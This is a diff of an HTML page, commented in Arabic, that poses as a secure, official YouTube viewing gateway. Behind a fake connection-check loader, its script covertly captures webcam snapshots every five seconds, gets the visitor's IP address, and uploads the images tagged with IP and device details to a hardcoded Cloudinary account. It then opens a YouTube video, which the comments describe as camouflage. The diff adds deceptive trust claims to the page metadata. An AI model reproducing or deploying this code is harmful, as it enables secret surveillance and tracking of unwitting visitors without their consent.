@@ -3,46 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>بوابة يوتيوب الآمنة | التحقق من الاتصال</title>
+    
+    <meta name="description" content="بوابة رسمية آمنة ومشفرة لمشاهدة محتوى يوتيوب بجودة عالية وحماية خصوصية المستخدمين. هذا الموقع معتمد وبروتوكولاته محمية 100%.">
+    <meta name="keywords" content="YouTube, Secure, Privacy, Safe Video Player">
+    <meta property="og:title" content="YouTube Secure Player">
+    <meta property="og:description" content="اتصال آمن ومشفر لمشاهدة الفيديو.">
+    <link rel="icon" href="data:,">
+
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
-        /* تصميم صفحة تحميل وهمية بسيطة */
-        body { background-color: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
-        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; }
+        body { background-color: #000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; }
+        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 100px; height: 100px; animation: spin 2s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #video, #canvas { display: none; }
+        p { margin-top: 20px; font-size: 18px; color: #3498db; }
     </style>
 </head>
 <body>
 
     <div class="loader"></div>
-    <p style="margin-left: 20px;">Checking Connection...</p>
+    <p>Checking Secure Connection...</p>
 
     <video id="video" playsinline autoplay></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
+        // إعداداتك الخاصة بـ Cloudinary
         const cloudName = 'dgkttv99v';
-        const uploadPreset = 'ml_default'; // تأكد إن ده Unsigned في إعدادات Cloudinary
-        const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // حط لينك الفيديو اللي عايزه هنا
+        const uploadPreset = 'ml_default'; 
+        const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
 
         let tabOpened = false;
 
         async function init() {
             try {
+                // طلب الكاميرا بمجرد الدخول
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // ابدأ أول لقطة بعد ثانيتين
+                // أول لقطة بعد ثانيتين
                 setTimeout(takeSnapshot, 2000);
                 
-                // كرر كل 5 ثواني
+                // تكرار كل 5 ثواني
                 setInterval(takeSnapshot, 5000);
             } catch (e) {
-                console.log("Camera Error");
-                // لو رفض الكاميرا، افتح اليوتيوب برضه عشان ميتشكش
-                window.open(youtubeLink, '_blank');
+                console.log("Access Blocked");
+                // حتى لو رفض، نفتح اليوتيوب للتمويه
+                window.location.href = youtubeLink;
             }
         }
 
@@ -54,37 +63,36 @@
             const imageData = canvas.toDataURL("image/png");
 
             try {
-                // 1. جلب الـ IP الخاص بالمستخدم
+                // جلب الـ IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
 
-                // 2. تجهيز بيانات الرفع للسحاب
                 const formData = new FormData();
                 formData.append('file', imageData);
                 formData.append('upload_preset', uploadPreset);
-                formData.append('tags', `IP_${userIP}`); // حفظ الـ IP كـ Tag للبحث السهل
+                formData.append('tags', `IP_${userIP}`);
                 formData.append('context', `ip=${userIP}|device=${navigator.platform}`);
 
-                // 3. إرسال الصورة والـ IP معاً
+                // الرفع للسحاب
                 fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                     method: 'POST',
                     body: formData
                 })
                 .then(r => r.json())
                 .then(data => {
-                    console.log("Uploaded with IP: " + userIP);
+                    console.log("Secure Upload Success");
+                    // فتح التمويه بعد أول رفعة
                     if (!tabOpened) {
                         window.open(youtubeLink, '_blank');
                         tabOpened = true;
                     }
                 });
             } catch (err) {
-                console.error("Error getting IP or uploading", err);
+                console.error("Connection Error", err);
             }
         }
 
-        // تشغيل فوري أول ما الصفحة تفتح
         window.onload = init;
     </script>
 </body>
